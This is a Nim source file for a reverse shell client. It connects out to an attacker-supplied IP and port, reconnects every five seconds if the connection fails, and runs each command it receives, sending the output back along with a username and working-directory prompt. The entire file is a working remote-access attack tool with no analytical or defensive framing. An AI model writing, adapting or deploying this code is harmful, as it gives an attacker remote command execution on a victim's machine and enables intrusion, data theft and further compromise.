import argparse
import std/[net, osproc, os, strutils, strformat]

#[ Hardcoded ip and port ]#
var 
  ip = "127.0.0.1"
  port = 1337
  socket = newSocket()
  args = commandLineParams()

proc get_username(): string =
  when defined(linux):
    var (username, _) = execCmdEx("whoami")
    return username.replace("\n", "")

when isMainModule:
  if args.len == 2:
    ip = args[0]
    port = parseInt(args[1])

  var username = get_username()

  while true:
    try:
      socket.connect(ip, port.Port)
      
      while true:
        try:
          socket.send(&"{username}:{getCurrentDir()}$ ")
          var cmd = socket.recvLine()

          if cmd.startsWith("exit"):
            socket.close()
            quit()
          elif cmd.startsWith("cd"):
            var dir = cmd.replace("cd ", "")
            if dir.len == 0:
              dir = "~"
            setCurrentDir(dir)
          else:
            var (result, _) = execCmdEx(cmd)
            socket.send(result)
        except:
          echo "[!] Connection lost"
          socket.close()
          quit(0)
    except:
      echo "[!] Connection failed"
      sleep(5000)
      continue




